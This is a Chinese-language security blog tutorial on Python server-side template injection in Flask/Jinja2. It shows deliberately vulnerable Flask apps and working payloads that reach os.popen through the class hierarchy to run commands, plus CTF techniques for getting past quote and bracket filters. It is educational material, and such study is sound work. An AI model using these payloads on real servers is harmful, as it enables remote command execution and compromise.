<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>python SSTI注入(一) - Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="基础知识学习什么是SSTI注入ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flas"><meta property="og:type" content="blog"><meta property="og:title" content="python SSTI注入(一)"><meta property="og:url" content="http://example.com/2021/02/28/python-SSTI%E6%B3%A8%E5%85%A5/"><meta property="og:site_name" content="Tlife"><meta property="og:description" content="基础知识学习什么是SSTI注入ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flas"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143230.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143711.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228181132.png"><meta property="article:published_time" content="2021-02-28T12:35:42.000Z"><meta property="article:modified_time" content="2022-08-13T16:35:28.942Z"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143230.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/02/28/python-SSTI%E6%B3%A8%E5%85%A5/"},"headline":"python SSTI注入(一)","image":["https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143230.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143711.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228181132.png"],"datePublished":"2021-02-28T12:35:42.000Z","dateModified":"2022-08-13T16:35:28.942Z","author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"基础知识学习什么是SSTI注入ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flas"}</script><link rel="canonical" href="http://example.com/2021/02/28/python-SSTI%E6%B3%A8%E5%85%A5/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Tlife" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-02-28T12:35:42.000Z" title="2021/2/28 下午8:35:42">2021-02-28</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-08-13T16:35:28.942Z" title="2022/8/14 上午12:35:28">2022-08-14</time></span><span class="level-item">27 minutes read (About 3999 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">python SSTI注入(一)</h1><div class="content"><h2 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h2><h3 id="什么是SSTI注入"><a href="#什么是SSTI注入" class="headerlink" title="什么是SSTI注入"></a>什么是SSTI注入</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 <a id="more"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>此时传参的变量为404_url，如果我们访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?404_url&#x3D;&#123;&#123;1-1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>页面将返回0。</p>
<p>在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。</p>
<p>直接将用户可控参数<code>request.args.get(&#39;404_url&#39;)</code>在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。</p>
<h3 id="Jinja2渲染模板"><a href="#Jinja2渲染模板" class="headerlink" title="Jinja2渲染模板"></a>Jinja2渲染模板</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x01 &#123;%%&#125;</span><br></pre></td></tr></table></figure>

<p>主要用来声明变量或用在条件语句或循环语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意条件和循环需要多一层 &#123;%endif%&#125; 或 &#123;%endfor%&#125;用作结尾</span><br><span class="line"></span><br><span class="line">&#123;% set c &#x3D; &#39;Zh1z3ven&#39; %&#125;</span><br><span class="line">&#123;% if 1&#x3D;&#x3D;1 %&#125;Zh1z3ven&#123;%endif%&#125;</span><br><span class="line">&#123;% for i in [1, 2, 3] %&#125;Zh1z3ven&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x02 &#96;&#123;&#123;&#125;&#125;&#96;</span><br></pre></td></tr></table></figure>

<p>将大括号内的表达式执行并输出结果到模板内</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;98-2&#125;&#125; # 96</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x03 &#96;&#123;##&#125;&#96;</span><br></pre></td></tr></table></figure>

<p>注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[]，&#123;&#125;，”</span><br></pre></td></tr></table></figure>

<p>是Python中的内置变量。通过内置变量的一些属性或函数去访问当前Python环境中的对象继承树，可以从继承树爬到根对象类。利用__subclasses__()等函数爬向每一个Object,这样便可以利用当前Python环境执行任意代码。</p>
<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
<p>让我们用例子来简析模板渲染。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$what&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
<h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><p>在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。</p>
<ul>
<li><code>__class__</code></li>
</ul>
<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串返回一个类所直接继承的类。</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。<br>该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<strong>globals</strong>属性访问全局的变量。该属性保存的是函数全局变量的<strong>字典</strong>引用。</p>
<p><code>__builtins__</code></p>
<p><code>__builtins__</code>下有<code>eval</code>，<code>__import__</code>等的函数，可以利用此来执行命令。</p>
<p>在看完上边这些自带方法、成员变量后，可能有点懵，接下来看看是如何利用这些方法以及成员变量达到我们想要的目的的。</p>
<p>在SSTI中，我们要做的无非就两个：</p>
<ul>
<li>执行命令</li>
<li>获取文件内容</li>
</ul>
<p>所以我们所做的一切实际上都是在往这两个结果靠拢。</p>
<p>例1:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> []._class_._base_.subclasses_()<span class="comment">#通过内置变量访问类——&gt;使用base输出类的父级——在通过subclasses()找到所有此父级的子级。</span></span><br></pre></td></tr></table></figure>

<h2 id="SSTI注入产生原因"><a href="#SSTI注入产生原因" class="headerlink" title="SSTI注入产生原因:"></a>SSTI注入产生原因:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;hwg&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h1&gt;Hello, %s !&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>% (name))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&#125;&#125; - hwg&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;/h1&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    user = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;hwg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;info&#x27;</span> : <span class="string">&#x27;I am hwg&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, title=<span class="string">&#x27;Home&#x27;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>对比上下两种代码书写两种形式:在第一种中，name参数是我们可控的，name参数后面会被直接渲染并将结果待会页面回显，所以这时就有了ssti注入:<br>在第二种中:<br>在flask中常用的渲染方法为<code>render_template()</code> 、 <code>render_template_string()</code></p>
<p>当使用 <code>render_template()</code> 时，扩展名为 <code>.html</code> 、 <code>.htm</code> 、 <code>.xml</code> 和 <code>.xhtml</code> 的模板中开启自动转义。</p>
<p>当使用 <code>render_template_string()</code> 时，字符串开启 自动转义。<br>分析一下，<strong>就是此时页面数据已经确定，并且渲染时将会被转义，即你输入的数据不会被当做指令执行</strong>，而是作为那两个花括号的一个内容进行渲染，可以看到render_template渲染的内容是index.html，而不是用户输入的数据。<br><strong>所以ssti产生原因便是：</strong><br>1.存在用户可控参数<br>2.用户输入参数直接被渲染，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可被带入代码中让jinja2模块识别并解析</p>
<h2 id="flask——ssti环境实战"><a href="#flask——ssti环境实战" class="headerlink" title="flask——ssti环境实战:"></a>flask——ssti环境实战:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%sfrom flask import Flask, request</span></span><br><span class="line"><span class="string">from jinja2 import Template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="string">def test1():</span></span><br><span class="line"><span class="string">    name = request.args.get(&#x27;name&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    t = Template(&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Zh1z3ven&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, %s !&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;% (name))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return t.render()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">    app.run(host=&#x27;127.0.0.1&#x27;, debug=True)&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h3 id="漏洞使用思路"><a href="#漏洞使用思路" class="headerlink" title="漏洞使用思路"></a>漏洞使用思路</h3><p>首先我们使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__<span class="comment">#这里的引号是为了引出父类任何数据结构都行包括[]&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>获取类，此时会返回类是str<br>再使用bases或者mro获取到object基类（因为object是所有类的基（父）类）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__</span><br></pre></td></tr></table></figure>

<p>接下来获取其所有子类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143230.png" alt="img" style="zoom:67%;">我们只需要寻找可能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。</p>
<p>获取到subclasses后，初步看了一下没有能直接执行命令或者获取文件内容的，接下来使用<strong>init</strong>.<strong>globals</strong>来看看有没有os module或者其他的可以读写文件的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">303</span>].__init__.__globals__&#125;&#125;</span><br><span class="line"><span class="comment">#此时更换为花括号 因为是要执行命令了，而这个303是通过爆破得到的，爆破到具有os模块，OS模块是Python标准库中的一个用于访问操作系统功能的模块</span></span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br><span class="line">//此时就会回显用户名</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228143711.png" alt="img" style="zoom:67%;">

<h2 id="CTF中的bypass"><a href="#CTF中的bypass" class="headerlink" title="CTF中的bypass"></a>CTF中的bypass</h2><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>我们如果想知道过滤了什么的时候，可以直接在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>中测试我们输入的内容，看看网页会不会回显</p>
<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>可以使用[]，’’代替第一个双引号<br>第二个双引号的作用:获取字典内对应索引的value<br>这里介绍一种查看方法,在python中使用type(内容)，可以查询内容的类性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type(&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228181132.png" alt="img" style="zoom:67%;">
此时我们可以知道 ：
后面的数据类型需要的是dict这里我们可以使用request.args来绕过此处引号的过滤。

<p>request.args是flask中一个存储着请求参数以及其值的字典，<br>使用方法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[request.args.arg1]&#125;&#125;&amp;arg1=os</span><br></pre></td></tr></table></figure>

<p>此时即可绕过后面双引号的过滤<br>这里还有一种方法：<br>还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>爆破subclasses中chr()函数在哪</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[chr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)][chr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>为什么要这样构造？:</p>
<p><code>&#123;% ... %&#125;</code> for <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures">Statements</a> ,可以实现for,if等语句,还支持set语法,可以给变量赋值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;</span><br></pre></td></tr></table></figure>

<p>先获取chr函数，赋值给chr，此时chr就拥有chr函数的功能了，然后接下来在后面拼接需要使用chr进行绕过的字符，如””</p>
<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>回看最初的payload，过滤中括号对我们影响最大的是什么，前边两个中括号都是为了从数组中取值，而后续的中括号实际是不必要的，<strong>globals</strong>[“os”]可以替换为<strong>globals</strong>.os。</p>
<p>所以过滤了中括号实际上影响我们的只有从数组中取值，然而从数组中取值，而从数组中取值可以使用pop/<strong>getitem</strong>等数组自带方法。</p>
<p>不过还是建议用<strong>getitem</strong>，因为pop会破坏数组的结构。</p>
<p>a[0]与a.<strong>getitem</strong>(0)的效果是一样的，所以上述payload可以用此来绕过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__()[<span class="number">300</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

